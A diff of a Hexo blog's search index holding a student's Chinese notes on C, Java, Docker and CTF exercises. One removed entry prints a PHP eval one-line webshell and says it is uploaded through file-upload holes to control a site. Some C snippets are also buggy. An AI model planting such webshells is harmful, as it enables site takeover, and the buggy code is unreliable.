+<p>​         ch=getchar（): 运行到这里输入一个字符后必须回车一下getchar才返回</p>
+<p>putchar （ch）</p>
+<p>8 小数四舍五入  scanf （”%f”，&amp;a）</p>
+<p>​                             a=int（a*1000+0.5）/1000.0</p>
+<p>​                             printf(“%0.3f”,a)</p>
+<p>C中保留两位小数</p>
+<p>1、float a=3.456</p>
+<p>​      float b=(int)(a*1000+0.5)/100.0</p>
+<p>2、float a=23,456789</p>
+<p>​      printf(“%2f”,a);</p>
+<p>9 scanf( )式格式输入函数</p>
+<p>它从标准输入设备(键盘)读取输入的信息</p>
+<p>10 double area</p>
+<p>建立一个类型为双精度浮点小数的变量，这个变量的名称是area</p>
+<p>%5.2f含义：输出一个浮点数</p>
+<p>格式为小数点前最多保留5位有效数字</p>
+<p>​            小数点后最多保留2位有效数字</p>
+<h4 id="在C语言中，能够获取字符串的函数至少有两个："><a href="#在C语言中，能够获取字符串的函数至少有两个：" class="headerlink" title="在C语言中，能够获取字符串的函数至少有两个："></a>在C语言中，能够获取字符串的函数至少有两个：</h4><p>1.scanf()</p>
+<p>所在头文件：stdio.h</p>
+<p>语法：scanf(“格式控制字符串”,变量地址列表);</p>
+<p>接受字符串时：scanf(“%s”,字符数组名或指针);</p>
+<p>2.gets()</p>
+<p>所在头文件：stdio.h</p>
+<p>语法：gets(字符数组名或指针);</p>
+<p>两者在接受字符串时：</p>
+<p>1.不同点：<br>gets可以接收空格；而scanf遇到空格、回车和Tab键都会认为输</p>
+<p>入结束，所有它不能接收空格。</p>
+<p>2.相同点：</p>
+<p>字符串接受结束后自动加’\0’。</p>
+<h4 id="printf和puts的区别"><a href="#printf和puts的区别" class="headerlink" title="printf和puts的区别"></a>printf和puts的区别</h4><p>相同点：<br>两者都属于stdio.h这个头文件<br>都能输出字符串</p>
+<p>不同点：<br>puts（）在输出字符串时会将’\0’自动转换成’\n’进行输出，也就是说，puts方法输出完字符串后会自动换行。</p>
+<ul>
+<li><h2 id><a href="#" class="headerlink" title></a></h2></li>
+</ul>
+<p> hexo new post 新建文章</p>
+<p>C 程序主要包括以下部分：</p>
+<ul>
+<li><p>预处理器指令</p>
+</li>
+<li><p>函数</p>
+</li>
+<li><p>变量</p>
+</li>
+<li><p>语句 &amp; 表达式</p>
+</li>
+<li><p>注释</p>
+<p>变量其实只不过是程序可操作的存储区的名称</p>
+<table>
+<thead>
+<tr>
+<th>char</th>
+<th>通常是一个字节（八位）。这是一个整数类型。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>int</td>
+<td>对机器而言，整数的最自然的大小。</td>
+</tr>
+<tr>
+<td>float</td>
+<td>单精度浮点值。单精度是这样的格式，1位符号，8位指数，23位小数。</td>
+</tr>
+<tr>
+<td>double</td>
+<td>双精度浮点值。双精度是1位符号，11位指数，52位小数。</td>
+</tr>
+<tr>
+<td>void</td>
+<td>表示类型的缺失。</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<p>   C 程序中可用的存储类：</p>
+<ul>
+<li><p>auto</p>
+</li>
+<li><p>register</p>
+</li>
+<li><p>static</p>
+</li>
+<li><p>extern</p>
+</li>
+</ul>
+<p>求余、模运算符（%）时bai要求两数必须是整型数据。%就是bai取余数运算,也就是模运算（mod）。</p>
+<p>10/3在C语言里是整除的意思，结果是3</p>
+<p>10%3是求余，结果是余数1</p>
+<p>10.0/3会转换为两个double型的数相除，答案是3.3333</p>
+<p>   7%4的结果是3<br>   -7%4的结果是-3<br>   3%-4的结果是3（**<em>结果符号与被除数相同**</em>）</p>
+<p>代码输入时无需特意对齐，注意符号即可。</p>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>mutiple</title>
     <url>/2021/05/12/buu/buuctf/</url>
     <content><![CDATA[<h2 id="Linux-Labs"><a href="#Linux-Labs" class="headerlink" title="Linux Labs"></a>Linux Labs</h2><p><img src="/2021/05/12/buu/buuctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(144).png"></p>
 <p>打开靶机后提示连接</p>
 <p>指令格式 ssh -p port</p>
-<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#x6e;&#111;&#x64;&#101;&#51;&#46;&#x62;&#117;&#x75;&#x6f;&#106;&#46;&#x63;&#110;">&#x72;&#x6f;&#111;&#116;&#64;&#x6e;&#111;&#x64;&#101;&#51;&#46;&#x62;&#117;&#x75;&#x6f;&#106;&#46;&#x63;&#110;</a></p>
+<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#114;&#111;&#x6f;&#x74;&#64;&#110;&#x6f;&#100;&#x65;&#x33;&#x2e;&#x62;&#117;&#x75;&#x6f;&#106;&#46;&#x63;&#110;">&#114;&#111;&#x6f;&#x74;&#64;&#110;&#x6f;&#100;&#x65;&#x33;&#x2e;&#x62;&#117;&#x75;&#x6f;&#106;&#46;&#x63;&#110;</a></p>
 <p>密码：123456</p>
 <h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开容器页面后</p>
 <p>出现三份.txt</p>
@@ -133,53 +516,128 @@
       </tags>
   </entry>
   <entry>
-    <title>docker</title>
-    <url>/2021/04/25/docker/docker/</url>
-    <content><![CDATA[<p><a href="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%7B%22request_id%22:%22162380439616780269841164%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=162380439616780269841164&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-90483576.first_rank_v2_pc_rank_v29&utm_term=docker&spm=1018.2226.3001.4187">(24条消息) docker入门(利用docker部署web应用)_仰望星空-CSDN博客_docker部署web项目</a></p>
-<p>这篇文章不错喔</p>
-<p>2021.6.16成功在 kali2020 安装了docker</p>
-<p>参考文章如下：</p>
-<p><a href="https://www.cnblogs.com/lijingrong/p/13396884.html">kali 2020安装docker - pipiqiu - 博客园 (cnblogs.com)</a></p>
-<p>其中一些命令：</p>
-<p>查看doucker运行状态（以下显示已启动和未启动）</p>
-<p><code>sudo systemctl status docker 或者 sudo service docker status</code></p>
-<p> 开启和停止docker服务</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker 或者sudo service docker start</span><br><span class="line">sudo systemctl stop docker 或者 sudo service docker stop</span><br></pre></td></tr></table></figure>]]></content>
+    <title>函数递归</title>
+    <url>/2020/11/14/c/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/</url>
+    <content><![CDATA[<p> 递归思想</p>
+<p>格式：void recursion() </p>
+<p>{   statements;   … … …   recursion(); /* 函数调用自身 */  </p>
+<p> … … … </p>
+<p>}</p>
+<p>  int main() </p>
+<p>{   recursion();</p>
+<p> }</p>
+<p>应用到求<u><strong>阶乘上，还有斐波那契数列</strong></u></p>
+<p> 递归函数可以使它调用其本身</p>
+<p>但是存在不利情况：</p>
+<p>电脑空间大致分<strong>Heap（堆）</strong>和<strong>Stack（栈）</strong>两种。</p>
+<p><strong>栈</strong>是用于<strong>函数</strong>的空间。</p>
+<p>电脑调用一个函数，就会使用一层栈；</p>
+<p>相反，电脑中一个函数结束（return），就会释放这一层栈，<strong>连同在这层栈（这个函数）中定义的所有东西</strong>。</p>
+<p>不在栈中的，应该就在堆中。<strong>（这就是定义全区变量与局部变量的用处）</strong></p>
+<p><strong>如果调用太多层栈（太多个函数），**</strong>电脑就会暴空间！**</p>
+<p>所以说，调用递归函数，就会<strong>一层一层地压栈</strong>，<strong>电脑就会暴空间！</strong>（<strong>并不代表不建议用递归，只是作提示而已</strong>）</p>
+<p><strong>递归</strong>，就是<strong>递（一层一层地调用）</strong>，<strong>归（一层一层地返回）</strong>，这样会<strong>费很多时间</strong>！容易<strong>超时</strong>！</p>
+<p><strong>但是，</strong>我并<strong>不是</strong>说不用递归，<strong>而是</strong>说能用递推算法的，最好不用递归算法，（原因你知道）。</p>
+]]></content>
       <tags>
-        <tag>web</tag>
+        <tag>c</tag>
       </tags>
   </entry>
   <entry>
-    <title>java学习记录</title>
-    <url>/2021/07/09/java/java1/</url>
-    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p> 尝试了好几种编程软件，发生了不同程度报错</p>
-<p>pycharm：连接debugger失败</p>
-<p>sublintext：扩展较mafan</p>
-<p>eclipse：届时应该会用</p>
-<p>最终敲定在假期使用vscode来编程java</p>
-<h4 id="7-9"><a href="#7-9" class="headerlink" title="7.9"></a>7.9</h4><p>经过昨天的多次失败，今天成功运行了Java，打印出了helloworld</p>
-<p>总结一下：<strong>文件名需与类名一致</strong></p>
-<p>使用了两个命令 <strong>javac</strong> 和 <strong>java</strong>。</p>
-<p>执行前先用Javac编译，注意要带上后缀。</p>
-<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(269).png" alt="屏幕截图(269)"></p>
-<p><img src="/2021/07/09/java/java1/662E827A-FA32-4464-B0BD-40087F429E98.jpg" alt="img"></p>
-<h5 id="菜鸟教程上的基本语法："><a href="#菜鸟教程上的基本语法：" class="headerlink" title="菜鸟教程上的基本语法："></a>菜鸟教程上的基本语法：</h5><ul>
-<li><strong>大小写敏感</strong>：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li>
-<li><strong>类名</strong>：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong> 。</li>
-<li><strong>方法名</strong>：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li>
-<li><strong>源文件名</strong>：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）。</li>
-<li><strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li>
-</ul>
-<p>突然发现之前无意中看到的vsdebugger有bug是真的，啊这</p>
-<p>调试半天都不行，还是直接cmd命令行更快。乌鱼子。。</p>
-<h4 id="7-10"><a href="#7-10" class="headerlink" title="7.10"></a>7.10</h4><p>清晨起来试了一下，很快嗷（doge）</p>
-<p>切换vscode里的断点，误打误撞成功了，直接可以编译运行Java文件，好耶</p>
-<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(271).png"></p>
-<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(273).png" alt="屏幕截图(273)"></p>
-<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(272).png"></p>
+    <title>二维数组</title>
+    <url>/2020/11/08/c/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
+    <content><![CDATA[<p> 二维数组（矩阵）</p>
+<p>例子：int a[6] [6] ;//6*6,6行6列</p>
+<p>访问二维数组 </p>
+<p>例子: a[0] [0] 访问a数组，第一行第一列中的元素</p>
+<p>注意防止越界访问（取值范围）</p>
+<p>二维数组初始化，可用嵌套语句for</p>
+<p>二维数组也可以对部分元素赋值</p>
+<p>如 int a[3] [4]="{{1}，{5}，{9}}"每一列第一个数</p>
+<p>二维数组的[ ] [ ]第一个“[ ]”可以不写</p>
 ]]></content>
       <tags>
-        <tag>java</tag>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>字符串连接</title>
+    <url>/2020/12/07/c/%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5/</url>
+    <content><![CDATA[<h4 id="今日：与字符串链接有关的函数"><a href="#今日：与字符串链接有关的函数" class="headerlink" title="今日：与字符串链接有关的函数"></a>今日：与字符串链接有关的函数</h4><p>strcpy，strcat；<br>strcat函数：<br>将两个char类型连接。<br>strcpy函数：<br>头文件：#include &lt; string.h&gt; 和 #include &lt;stdio.h&gt;<br>功能：把从src地址开始且含有NULL结束符的字符串复制到以dest开始的 地址空间</p>
+<p>​                              可变参数  链接：<a href="https://blog.csdn.net/longintchar/article/details/85490103">https://blog.csdn.net/longintchar/article/details/85490103</a></p>
+<p>[^摘取自链接：<a href="https://blog.csdn.net/slk11580/article/details/79571478]">https://blog.csdn.net/slk11580/article/details/79571478]</a>: </p>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>指针</title>
+    <url>/2020/11/08/c/%E6%8C%87%E9%92%88/</url>
+    <content><![CDATA[<p> 指针和指针变量</p>
+<p>char *pa;//  定义一个指向字符型的指针变量；</p>
+<p>int *pb;//   定义一个指向整型的指针变量；</p>
+<p>取地址运算符  &amp;</p>
+<p>取值运算符   *</p>
+<p>未理解的</p>
+<p>（now，a）</p>
+<p>( the addr of a is)</p>
+<p>避免访问未初始化的指针</p>
+]]></content>
+      <tags>
+        <tag>指针</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>占用内存有关</title>
+    <url>/2020/10/15/c/%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E6%9C%89%E5%85%B3/</url>
+    <content><![CDATA[<p>让整数占用更少的内存可以在 int 前边加 short，让整数占用更多的内存可以在 int 前边加 long，例如：</p>
+<p>short int a = 10;<br>short int b, c = 99;<br>long int m = 102023;<br>long int n, p = 562131;</p>
+<p>这样 a、b、c 只占用 2 个字节的内存，而 m、n、p 可能会占用 8 个字节的内存。</p>
+<p>也可以将 int 省略，只写 short 和 long，如下所示：</p>
+<p>short a = 10;<br>short b, c = 99;<br>long m = 102023;<br>long n, p = 562131;</p>
+<p>这样的写法更加简洁，实际开发中常用。</p>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>程序实验三</title>
+    <url>/2020/11/12/c/%E7%A8%8B%E5%BA%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
+    <content><![CDATA[<p> 1、整数取反时，可用到reverse函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int reverse(int n)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​          int temp&#x3D;0;</span><br><span class="line">​	while (n!&#x3D;0)</span><br><span class="line">​	&#123;</span><br><span class="line">​		temp&#x3D;temp*10+n%10;</span><br><span class="line">​		n&#x3D;n&#x2F;10;</span><br><span class="line">​		</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	return temp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、倒金字塔</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int i,n,j;</span><br><span class="line">	printf(&quot;请输入一个整数: \n&quot;);</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	  for(j&#x3D;1;j&lt;i;j++)</span><br><span class="line">	    printf(&quot; &quot;);</span><br><span class="line">     	for(j&#x3D;2*n-1;j&gt;&#x3D;2*i-1;j--)</span><br><span class="line">     	printf(&quot;*&quot;);</span><br><span class="line">	     printf(&quot;\n&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3、求和</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a,n,i,j,sum;</span><br><span class="line">	printf(&quot;请输入两个整数分别为a&#x3D; n&#x3D; \n&quot;);</span><br><span class="line">	scanf(&quot;%d %d&quot;,&amp;a,&amp;n);</span><br><span class="line">	sum&#x3D;0,j&#x3D;0;</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">		j&#x3D;j*10+a;</span><br><span class="line">		sum&#x3D;sum+j;</span><br><span class="line">		printf(&quot;a+aa+aaa+.....&#x3D;%d\n&quot;,sum);</span><br><span class="line">	&#125; </span><br><span class="line">	return 0;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>水仙花数、素数</title>
+    <url>/2020/10/31/c/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0%E3%80%81%E7%B4%A0%E6%95%B0/</url>
+    <content><![CDATA[<p>   <strong>水仙花数</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a,b,c,d;</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;a);</span><br><span class="line">	b&#x3D;a&#x2F;100;</span><br><span class="line">	c&#x3D;a&#x2F;10%10;</span><br><span class="line">	d&#x3D;a%10;</span><br><span class="line">	if(b*100+c*10+d&#x3D;&#x3D;b*b*b+c*c*c+d*d*d) printf(&quot;Yes&quot;);</span><br><span class="line">	else  printf(&quot;No&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意取余，若要求求出范围内的所有水仙花数，则用for语句。</p>
+<p>​    <strong>素数</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int IsPrime(int x)</span><br><span class="line"></span><br><span class="line">&#123;  int i;</span><br><span class="line"></span><br><span class="line">for(i&#x3D;2;i&lt;x;i++)</span><br><span class="line"></span><br><span class="line">if(!(x%i))</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">rerurn 1;</span><br><span class="line"></span><br><span class="line">&#125;                                     </span><br></pre></td></tr></table></figure>
+
+<p> 解释：x%i 的意思是 x对i求余，整个意思是 ：如果 x对i的余数是0      则为真</p>
+<p>​                                                   就接着执行下面的程序。 </p>
+<p>​                                                           </p>
+<h3 id="写prime函数判断一个数是否是素数"><a href="#写prime函数判断一个数是否是素数" class="headerlink" title="写prime函数判断一个数是否是素数"></a>写prime函数判断一个数是否是素数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void main ( )</span><br><span class="line">&#123;</span><br><span class="line">int m,n,i,j,k;</span><br><span class="line">scanf(&quot;%d %d&quot;,&amp;m,&amp;n);</span><br><span class="line">for(i&#x3D;m;i&lt;&#x3D;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">if(i&#x3D;&#x3D;2) &#123; &#x2F;&#x2F;如果是bai2， 直接输出。</span><br><span class="line">printf( &quot;%d &quot;, i);</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">for(j&#x3D;2;j&lt;i;j++) &#x2F;&#x2F;应该是j&lt;i</span><br><span class="line">if(i%j&#x3D;&#x3D;0) break; &#x2F;&#x2F;这个break只能跳du出最内层的for循环</span><br><span class="line">if(j&#x3D;&#x3D;i) printf(&quot;%d &quot;,i); &#x2F;&#x2F;printf应该放到循zhi环外，并且只有当j&#x3D;&#x3D;i的时候i才是dao素数</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>c</tag>
       </tags>
   </entry>
   <entry>
@@ -250,27 +708,20 @@
       </tags>
   </entry>
   <entry>
-    <title>新手区</title>
-    <url>/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
-    <content><![CDATA[<h4 id="stegnao"><a href="#stegnao" class="headerlink" title="stegnao"></a>stegnao</h4><p>打开后文档如图</p>
-<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(120).png"></p>
-<p>明显没有flag，试着用编辑器看了下，找到隐含文字</p>
-<p>Creator(LaTeX /o/)/Producer(find mr.morse text)/Keywords(Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==)</p>
-<p>看上去像是base64，解码后果然没那么简单，提示信息flag也不在这里</p>
-<p>那么我们再从文本出发</p>
-<p>ctrl+a后到文本中，有线索了！</p>
-<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(121).png"></p>
-<p>出现了诸如BA的排列组合，联想到之前的文字里：**(find mr.morse text)**提示我们摩斯电码</p>
-<p>这里刚好莫斯电码就是以 - 和 . 来表达信息的，于是我们进行替换</p>
-<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(122).png"></p>
-<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(123).png"></p>
-<p>得到了摩斯电码后，直接上在线编码即可</p>
-<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(124).png"></p>
-<p>如图，flag</p>
-<p>不过我们还要按照题目要求将FLAG后字母小写，得到最后解答。</p>
-]]></content>
+    <title>docker</title>
+    <url>/2021/04/25/docker/docker/</url>
+    <content><![CDATA[<p><a href="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%7B%22request_id%22:%22162380439616780269841164%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=162380439616780269841164&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-90483576.first_rank_v2_pc_rank_v29&utm_term=docker&spm=1018.2226.3001.4187">(24条消息) docker入门(利用docker部署web应用)_仰望星空-CSDN博客_docker部署web项目</a></p>
+<p>这篇文章不错喔</p>
+<p>2021.6.16成功在 kali2020 安装了docker</p>
+<p>参考文章如下：</p>
+<p><a href="https://www.cnblogs.com/lijingrong/p/13396884.html">kali 2020安装docker - pipiqiu - 博客园 (cnblogs.com)</a></p>
+<p>其中一些命令：</p>
+<p>查看doucker运行状态（以下显示已启动和未启动）</p>
+<p><code>sudo systemctl status docker 或者 sudo service docker status</code></p>
+<p> 开启和停止docker服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker 或者sudo service docker start</span><br><span class="line">sudo systemctl stop docker 或者 sudo service docker stop</span><br></pre></td></tr></table></figure>]]></content>
       <tags>
-        <tag>攻防世界_misc</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -331,284 +782,60 @@
       </tags>
   </entry>
   <entry>
-    <title>php</title>
-    <url>/2021/02/14/php/php/</url>
-    <content><![CDATA[<h4 id="7-17"><a href="#7-17" class="headerlink" title="7.17"></a>7.17</h4><p>var关键字的用法</p>
-<p>var，variable  变量的意思。</p>
-<p>看看例子，如果我这样使用var：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 var $a&#x3D;123;</span><br><span class="line">2 echo $a;</span><br><span class="line">3 &#x2F;&#x2F;那么程序会提示语法错误，要去掉var这个变量定义才行。直接</span><br><span class="line">4 $a&#x3D;123;</span><br><span class="line">5 echo $a;</span><br><span class="line">6 &#x2F;&#x2F;这样才不会报错，php是弱类型语言，所以不声明类型是没问题的。</span><br></pre></td></tr></table></figure>
-
-<p>那var什么时候才能用，请看：</p>
-<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 class Test&#123;</span><br><span class="line">2 var $a&#x3D;123;&#x2F;&#x2F;访问控制，这里的var不用就不正常，当然你可以用public protected等关键词代替，来声明成员变量的属性</span><br><span class="line">3 </span><br><span class="line">4 &#125;</span><br><span class="line">5 $obj&#x3D;new Test();</span><br><span class="line">6 echo $obj-&gt;a;</span><br><span class="line">7 &#x2F;&#x2F;打印结果：123</span><br></pre></td></tr></table></figure>
-
-<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
-<p>如果把var换成public，一样可以的。<br>但是这个时候你在类中去掉var,什么访问修饰符都没有，那会提示语法错误的。</p>
-<p>​                                                           摘抄自<a href="https://www.cnblogs.com/lyf-blog/p/5681308.html">php中var关键字用法 - DespicableMe - 博客园 (cnblogs.com)</a></p>
+    <title>新手区</title>
+    <url>/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
+    <content><![CDATA[<h4 id="stegnao"><a href="#stegnao" class="headerlink" title="stegnao"></a>stegnao</h4><p>打开后文档如图</p>
+<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(120).png"></p>
+<p>明显没有flag，试着用编辑器看了下，找到隐含文字</p>
+<p>Creator(LaTeX /o/)/Producer(find mr.morse text)/Keywords(Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==)</p>
+<p>看上去像是base64，解码后果然没那么简单，提示信息flag也不在这里</p>
+<p>那么我们再从文本出发</p>
+<p>ctrl+a后到文本中，有线索了！</p>
+<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(121).png"></p>
+<p>出现了诸如BA的排列组合，联想到之前的文字里：**(find mr.morse text)**提示我们摩斯电码</p>
+<p>这里刚好莫斯电码就是以 - 和 . 来表达信息的，于是我们进行替换</p>
+<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(122).png"></p>
+<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(123).png"></p>
+<p>得到了摩斯电码后，直接上在线编码即可</p>
+<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(124).png"></p>
+<p>如图，flag</p>
+<p>不过我们还要按照题目要求将FLAG后字母小写，得到最后解答。</p>
 ]]></content>
       <tags>
-        <tag>php</tag>
+        <tag>攻防世界_misc</tag>
       </tags>
   </entry>
   <entry>
-    <title>php拓展</title>
-    <url>/2021/02/19/php/php%E6%8B%93%E5%B1%95/</url>
-    <content><![CDATA[<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>最简单的一句话：<?php @eval($_POST['attack']);?></p>
-<p>​                                <?php @eval($_POST['mima']);?></p>
-<p>​                                <?php @eval($_POST['muma']);?></p>
-<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>​        利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过蚁剑即可获取和控制整个网站目录。</p>
-<p>​        @表示后面即使执行错误，也不报错。<strong>eval（）函数</strong>表示括号内的语句字符串什么/.的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。（也就是[‘     ‘]里的数值可以改变，作为密码）</p>
-<h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h5><p>​                    （1）木马上传成功，未被杀；<br>​                    （2）知道木马的路径在哪；<br>​                    （3）上传的木马能正常运行。</p>
-]]></content>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>C语言求余问题</title>
-    <url>/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
-    <content><![CDATA[<h4 id="c语言中-a为一个四位数-那么a-1000-100是啥"><a href="#c语言中-a为一个四位数-那么a-1000-100是啥" class="headerlink" title="c语言中 a为一个四位数 那么a%1000/100是啥"></a>c语言中 a为一个四位数 那么a%1000/100是啥</h4><p>假设a的值为1345，那么当a%1000，值为345，那么345/100，结果就是3；<br>所以这个算法是用来取得这个四位数的百位数值</p>
-<p>同样的思想应用在水仙花数上，取百位，十位，个位上的数分别为</p>
-<p>a，b，c，d</p>
-<p>b=a/100；</p>
-<p>c=a/10%10;</p>
-<p>d=a%10;</p>
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>占用内存有关</title>
-    <url>/2020/10/15/c/%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E6%9C%89%E5%85%B3/</url>
-    <content><![CDATA[<p>让整数占用更少的内存可以在 int 前边加 short，让整数占用更多的内存可以在 int 前边加 long，例如：</p>
-<p>short int a = 10;<br>short int b, c = 99;<br>long int m = 102023;<br>long int n, p = 562131;</p>
-<p>这样 a、b、c 只占用 2 个字节的内存，而 m、n、p 可能会占用 8 个字节的内存。</p>
-<p>也可以将 int 省略，只写 short 和 long，如下所示：</p>
-<p>short a = 10;<br>short b, c = 99;<br>long m = 102023;<br>long n, p = 562131;</p>
-<p>这样的写法更加简洁，实际开发中常用。</p>
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>C语言注</title>
-    <url>/2020/10/18/c/C%E8%AF%AD%E8%A8%80%E6%B3%A8/</url>
